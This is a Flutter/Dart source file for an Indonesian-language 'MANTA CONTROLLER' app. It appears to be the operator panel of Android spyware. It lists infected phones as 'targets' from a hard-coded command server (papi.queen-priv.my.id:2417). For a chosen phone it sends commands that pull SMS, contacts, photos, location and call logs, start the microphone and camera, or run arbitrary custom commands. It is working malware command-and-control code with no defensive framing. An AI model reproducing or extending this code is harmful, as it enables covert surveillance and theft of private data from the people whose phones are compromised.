import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});
  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  static const Color _bg    = Color(0xFF060B14);
  static const Color _card  = Color(0xFF0D1B2A);
  static const Color _card2 = Color(0xFF111D2C);
  static const Color _cyan  = Color(0xFF00BCD4);
  static const Color _border = Color(0xFF1A2E3A);

  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;
  String _filter = 'all'; // all | online | offline
  String _search = '';
  final _searchCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    _fetch();
    _timer = Timer.periodic(const Duration(seconds: 10), (_) => _fetch());
  }

  @override
  void dispose() { _timer?.cancel(); _searchCtrl.dispose(); super.dispose(); }

  Future<void> _fetch() async {
    try {
      final res = await http.get(
        Uri.parse('http://papi.queen-priv.my.id:2417/api/list-targets'),
      ).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200 && mounted) {
        setState(() { _devices = jsonDecode(res.body); _isLoading = false; });
      }
    } catch (e) { if (mounted) setState(() => _isLoading = false); }
  }

  Future<void> _deleteDevice(String id) async {
    try {
      await http.delete(Uri.parse('http://papi.queen-priv.my.id:2417/api/delete-target/$id'))
          .timeout(const Duration(seconds: 8));
      _fetch();
    } catch (_) {}
  }

  List<dynamic> get _filtered {
    var list = _devices;
    if (_filter == 'online') list = list.where((d) => (d['status'] ?? '') == 'online').toList();
    if (_filter == 'offline') list = list.where((d) => (d['status'] ?? '') != 'online').toList();
    if (_search.isNotEmpty) list = list.where((d) =>
      (d['model'] ?? '').toString().toLowerCase().contains(_search.toLowerCase()) ||
      (d['id'] ?? '').toString().toLowerCase().contains(_search.toLowerCase())).toList();
    return list;
  }

  int get _onlineCount => _devices.where((d) => (d['status'] ?? '') == 'online').length;

  Color _deviceColor(dynamic d) {
    final model = (d['model'] ?? '').toString().toLowerCase();
    if (model.contains('xiaomi') || model.contains('redmi')) return const Color(0xFFFF6D00);
    if (model.contains('samsung')) return const Color(0xFF1565C0);
    if (model.contains('vivo')) return const Color(0xFF6A1B9A);
    if (model.contains('oppo')) return const Color(0xFF00695C);
    if (model.contains('realme')) return const Color(0xFFAD1457);
    if (model.contains('itel')) return const Color(0xFFD84315);
    return _cyan;
  }

  String _timeAgo(dynamic d) {
    final ts = d['lastSeen'] ?? d['timestamp'] ?? d['updated_at'] ?? '';
    if (ts.isEmpty) return '';
    try {
      final dt = DateTime.parse(ts.toString());
      final diff = DateTime.now().difference(dt);
      if (diff.inSeconds < 60) return '${diff.inSeconds}d lalu';
      if (diff.inMinutes < 60) return '${diff.inMinutes}m lalu';
      if (diff.inHours < 24) return '${diff.inHours}j lalu';
      return '${diff.inDays}h lalu';
    } catch (_) { return ts.toString(); }
  }

  @override
  Widget build(BuildContext context) {
    final filtered = _filtered;
    final onlineC = _onlineCount;
    final offlineC = _devices.length - onlineC;

    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(
        child: Column(children: [
          // ── HEADER ──
          Container(
            padding: const EdgeInsets.fromLTRB(16, 12, 16, 12),
            decoration: BoxDecoration(color: _card, border: Border(bottom: BorderSide(color: _border))),
            child: Row(children: [
              IconButton(
                icon: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white, size: 18),
                onPressed: () => Navigator.pop(context),
                padding: EdgeInsets.zero, constraints: const BoxConstraints(),
              ),
              const SizedBox(width: 10),
              Container(
                width: 40, height: 40,
                decoration: BoxDecoration(color: _cyan.withOpacity(0.12), borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: _cyan.withOpacity(0.3))),
                child: const Icon(Icons.track_changes_rounded, color: _cyan, size: 20),
              ),
              const SizedBox(width: 10),
              Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Row(children: [
                  const Text("MANTA", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15, letterSpacing: 1)),
                  const SizedBox(width: 8),
                  Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                    decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(6), border: Border.all(color: Colors.white12)),
                    child: const Text("CONTROLLER", style: TextStyle(color: Colors.white60, fontSize: 8, letterSpacing: 2, fontWeight: FontWeight.bold))),
                ]),
                Text("● ${_devices.length} perangkat · $onlineC online",
                  style: TextStyle(color: onlineC > 0 ? Colors.green : Colors.white38, fontSize: 11)),
              ])),
              GestureDetector(
                onTap: () { setState(() => _search = ''); _fetch(); },
                child: Container(width: 36, height: 36, decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(10)),
                  child: const Icon(Icons.refresh_rounded, color: Colors.white54, size: 18)),
              ),
              const SizedBox(width: 8),
              GestureDetector(
                onTap: () => setState(() {}),
                child: Container(width: 36, height: 36, decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(10)),
                  child: const Icon(Icons.search_rounded, color: Colors.white54, size: 18)),
              ),
            ]),
          ),

          // ── FILTER CHIPS ──
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            child: Row(children: [
              _chip('all', '🖥 ${_devices.length} Total', Colors.white38),
              const SizedBox(width: 8),
              _chip('online', '● $onlineC Online', Colors.green),
              const SizedBox(width: 8),
              _chip('offline', '⏻ $offlineC Offline', const Color(0xFFBF360C)),
            ]),
          ),

          // ── SEARCH BAR ──
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 8),
            child: Container(
              decoration: BoxDecoration(color: _card2, borderRadius: BorderRadius.circular(10), border: Border.all(color: _border)),
              child: TextField(
                controller: _searchCtrl,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                onChanged: (v) => setState(() => _search = v),
                decoration: const InputDecoration(
                  hintText: "Cari perangkat...",
                  hintStyle: TextStyle(color: Colors.white24),
                  prefixIcon: Icon(Icons.search_rounded, color: Colors.white24, size: 18),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.symmetric(vertical: 10),
                ),
              ),
            ),
          ),

          // ── DEVICE LIST ──
          Expanded(
            child: _isLoading
              ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                  Container(width: 60, height: 60, decoration: BoxDecoration(color: _cyan.withOpacity(0.1), shape: BoxShape.circle,
                    border: Border.all(color: _cyan.withOpacity(0.3), width: 2)),
                    child: const Icon(Icons.track_changes_rounded, color: _cyan, size: 28)),
                  const SizedBox(height: 16),
                  const Text("Memuat perangkat...", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 4),
                  const Text("Terhubung ke server", style: TextStyle(color: Colors.white38, fontSize: 12)),
                ]))
              : filtered.isEmpty
                ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                    const Icon(Icons.devices_other_rounded, color: Colors.white12, size: 48),
                    const SizedBox(height: 12),
                    const Text("Tidak ada perangkat", style: TextStyle(color: Colors.white38)),
                  ]))
                : ListView.builder(
                    padding: const EdgeInsets.symmetric(horizontal: 16),
                    itemCount: filtered.length,
                    itemBuilder: (ctx, i) => _deviceCard(filtered[i]),
                  ),
          ),
        ]),
      ),
    );
  }

  Widget _chip(String filter, String label, Color color) {
    final sel = _filter == filter;
    return GestureDetector(
      onTap: () => setState(() => _filter = filter),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
        decoration: BoxDecoration(
          color: sel ? color.withOpacity(0.15) : Colors.transparent,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: sel ? color : Colors.white12),
        ),
        child: Text(label, style: TextStyle(color: sel ? color : Colors.white38, fontSize: 11, fontWeight: FontWeight.bold)),
      ),
    );
  }

  Widget _deviceCard(dynamic d) {
    final isOnline = (d['status'] ?? '') == 'online';
    final color = _deviceColor(d);
    final model = d['model'] ?? 'Unknown Device';
    final id = d['id'] ?? '';
    final sdk = d['sdk'] ?? d['android_version'] ?? '';
    final proto = d['protocol'] ?? 'HTTP';
    final timeAgo = _timeAgo(d);

    return Container(
      margin: const EdgeInsets.only(bottom: 10),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: isOnline ? color.withOpacity(0.3) : _border),
      ),
      child: Column(children: [
        Padding(
          padding: const EdgeInsets.all(14),
          child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
            // Icon device
            Container(
              width: 48, height: 48,
              decoration: BoxDecoration(
                color: color.withOpacity(0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: color.withOpacity(0.3)),
              ),
              child: Icon(Icons.phone_android_rounded, color: color, size: 24),
            ),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(model, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15)),
              const SizedBox(height: 4),
              Row(children: [
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                  decoration: BoxDecoration(
                    color: isOnline ? Colors.green.withOpacity(0.15) : const Color(0xFFBF360C).withOpacity(0.15),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: isOnline ? Colors.green.withOpacity(0.4) : const Color(0xFFBF360C).withOpacity(0.4)),
                  ),
                  child: Row(children: [
                    Container(width: 5, height: 5, decoration: BoxDecoration(
                      color: isOnline ? Colors.green : const Color(0xFFBF360C), shape: BoxShape.circle)),
                    const SizedBox(width: 4),
                    Text(isOnline ? 'Online' : timeAgo.isEmpty ? 'Offline' : timeAgo,
                      style: TextStyle(color: isOnline ? Colors.green : const Color(0xFFBF360C), fontSize: 10, fontWeight: FontWeight.bold)),
                  ]),
                ),
                const SizedBox(width: 8),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                  decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(6)),
                  child: Text('HTTP $proto', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                ),
              ]),
            ])),
            // Kontrol button
            Column(children: [
              ElevatedButton.icon(
                onPressed: () => _openControl(d),
                style: ElevatedButton.styleFrom(
                  backgroundColor: isOnline ? Colors.green.withOpacity(0.15) : color.withOpacity(0.15),
                  foregroundColor: isOnline ? Colors.green : color,
                  side: BorderSide(color: isOnline ? Colors.green.withOpacity(0.4) : color.withOpacity(0.4)),
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  minimumSize: Size.zero,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                ),
                icon: const Icon(Icons.wifi_tethering_rounded, size: 14),
                label: const Text("Kontrol", style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold)),
              ),
              const SizedBox(height: 6),
              GestureDetector(
                onTap: () => _confirmDelete(id, model),
                child: Container(
                  width: 32, height: 32,
                  decoration: BoxDecoration(color: Colors.red.withOpacity(0.1), borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: Colors.red.withOpacity(0.3))),
                  child: const Icon(Icons.delete_outline_rounded, color: Colors.red, size: 16),
                ),
              ),
            ]),
          ]),
        ),
        // Bottom bar — SDK + ID
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.03),
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(16)),
            border: Border(top: BorderSide(color: _border)),
          ),
          child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            if (sdk.toString().isNotEmpty)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(color: const Color(0xFF6A1B9A).withOpacity(0.15), borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: const Color(0xFF6A1B9A).withOpacity(0.3))),
                child: Row(children: [
                  const Icon(Icons.android_rounded, color: Color(0xFFAB47BC), size: 10),
                  const SizedBox(width: 4),
                  Text("SDK $sdk", style: const TextStyle(color: Color(0xFFAB47BC), fontSize: 10, fontWeight: FontWeight.bold)),
                ]),
              )
            else const SizedBox(),
            GestureDetector(
              onTap: () { Clipboard.setData(ClipboardData(text: id)); ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("ID disalin!"), duration: Duration(seconds: 1))); },
              child: Row(children: [
                const Icon(Icons.circle, color: Colors.white24, size: 6),
                const SizedBox(width: 4),
                Text(id.length > 16 ? '${id.substring(0, 16)}' : id, style: const TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace')),
              ]),
            ),
          ]),
        ),
      ]),
    );
  }

  void _openControl(dynamic d) {
    Navigator.push(context, MaterialPageRoute(builder: (_) => DeviceControlPage(device: d)));
  }

  void _confirmDelete(String id, String model) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF0D1B2A),
      title: const Text("Hapus Perangkat?", style: TextStyle(color: Colors.white)),
      content: Text("Hapus $model dari daftar?", style: const TextStyle(color: Colors.white54)),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text("Batal", style: TextStyle(color: Colors.white38))),
        TextButton(onPressed: () { Navigator.pop(context); _deleteDevice(id); }, child: const Text("Hapus", style: TextStyle(color: Colors.red))),
      ],
    ));
  }
}

// ═══════════════════════════════════════════════
//  DEVICE CONTROL PAGE
// ═══════════════════════════════════════════════
class DeviceControlPage extends StatefulWidget {
  final dynamic device;
  const DeviceControlPage({super.key, required this.device});
  @override
  State<DeviceControlPage> createState() => _DeviceControlPageState();
}

class _DeviceControlPageState extends State<DeviceControlPage> {
  static const Color _bg    = Color(0xFF060B14);
  static const Color _card  = Color(0xFF0D1B2A);
  static const Color _cyan  = Color(0xFF00BCD4);
  static const Color _border = Color(0xFF1A2E3A);

  bool _sending = false;
  String? _lastResult;
  final _cmdCtrl = TextEditingController();

  Future<void> _sendCommand(String cmd, {String? arg}) async {
    setState(() { _sending = true; _lastResult = null; });
    try {
      final body = {'target_id': widget.device['id'], 'command': cmd, if (arg != null) 'arg': arg};
      final res = await http.post(
        Uri.parse('http://papi.queen-priv.my.id:2417/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(body),
      ).timeout(const Duration(seconds: 12));
      final data = jsonDecode(res.body);
      setState(() { _lastResult = data['result']?.toString() ?? data['message']?.toString() ?? 'OK'; });
    } catch (e) {
      setState(() { _lastResult = 'Error: $e'; });
    }
    setState(() => _sending = false);
  }

  @override
  Widget build(BuildContext context) {
    final d = widget.device;
    final model = d['model'] ?? 'Unknown';
    final isOnline = (d['status'] ?? '') == 'online';

    return Scaffold(
      backgroundColor: _bg,
      appBar: AppBar(
        backgroundColor: _card,
        leading: IconButton(icon: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white), onPressed: () => Navigator.pop(context)),
        title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(model, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
          Text(isOnline ? '● Online' : '● Offline', style: TextStyle(color: isOnline ? Colors.green : Colors.red, fontSize: 10)),
        ]),
        bottom: PreferredSize(preferredSize: const Size.fromHeight(1), child: Container(color: _border, height: 1)),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(children: [
          // Quick commands grid
          GridView.count(
            shrinkWrap: true, physics: const NeverScrollableScrollPhysics(),
            crossAxisCount: 3, crossAxisSpacing: 10, mainAxisSpacing: 10, childAspectRatio: 1.1,
            children: [
              _cmdBtn(Icons.sms_rounded, "SMS List", 'sms_list', Colors.blue),
              _cmdBtn(Icons.contacts_rounded, "Kontak", 'contacts', Colors.green),
              _cmdBtn(Icons.photo_library_rounded, "Galeri", 'gallery', Colors.purple),
              _cmdBtn(Icons.location_on_rounded, "Lokasi", 'location', Colors.red),
              _cmdBtn(Icons.mic_rounded, "Mikrofon", 'mic_start', Colors.orange),
              _cmdBtn(Icons.camera_alt_rounded, "Kamera", 'camera', Colors.teal),
              _cmdBtn(Icons.call_rounded, "Call Log", 'call_log', Colors.indigo),
              _cmdBtn(Icons.apps_rounded, "App List", 'app_list', Colors.cyan),
              _cmdBtn(Icons.vibration_rounded, "Vibrate", 'vibrate', Colors.pink),
            ],
          ),
          const SizedBox(height: 16),
          // Custom command input
          Container(
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(color: _card, borderRadius: BorderRadius.circular(14), border: Border.all(color: _border)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text("Custom Command", style: TextStyle(color: Colors.white70, fontSize: 12, letterSpacing: 1)),
              const SizedBox(height: 8),
              Row(children: [
                Expanded(
                  child: Container(
                    decoration: BoxDecoration(color: const Color(0xFF0A1520), borderRadius: BorderRadius.circular(10), border: Border.all(color: _border)),
                    child: TextField(
                      controller: _cmdCtrl,
                      style: const TextStyle(color: Colors.white, fontSize: 13, fontFamily: 'monospace'),
                      decoration: const InputDecoration(hintText: "ketik command...", hintStyle: TextStyle(color: Colors.white24), border: InputBorder.none, contentPadding: EdgeInsets.symmetric(horizontal: 12, vertical: 10)),
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                ElevatedButton(
                  onPressed: _sending ? null : () => _sendCommand(_cmdCtrl.text.trim()),
                  style: ElevatedButton.styleFrom(backgroundColor: _cyan, foregroundColor: Colors.black, padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))),
                  child: _sending ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.black)) : const Icon(Icons.send_rounded, size: 18),
                ),
              ]),
            ]),
          ),
          // Result
          if (_lastResult != null) ...[
            const SizedBox(height: 12),
            Container(
              width: double.infinity, padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(color: const Color(0xFF0A1A0A), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.green.withOpacity(0.3))),
              child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text("HASIL", style: TextStyle(color: Colors.green, fontSize: 10, letterSpacing: 2)),
                const SizedBox(height: 8),
                SelectableText(_lastResult!, style: const TextStyle(color: Colors.greenAccent, fontSize: 12, fontFamily: 'monospace')),
              ]),
            ),
          ],
        ]),
      ),
    );
  }

  Widget _cmdBtn(IconData icon, String label, String cmd, Color color) {
    return GestureDetector(
      onTap: () => _sendCommand(cmd),
      child: Container(
        decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: color.withOpacity(0.3))),
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Icon(icon, color: color, size: 26),
          const SizedBox(height: 6),
          Text(label, style: TextStyle(color: color, fontSize: 9, fontWeight: FontWeight.bold), textAlign: TextAlign.center),
        ]),
      ),
    );
  }
}
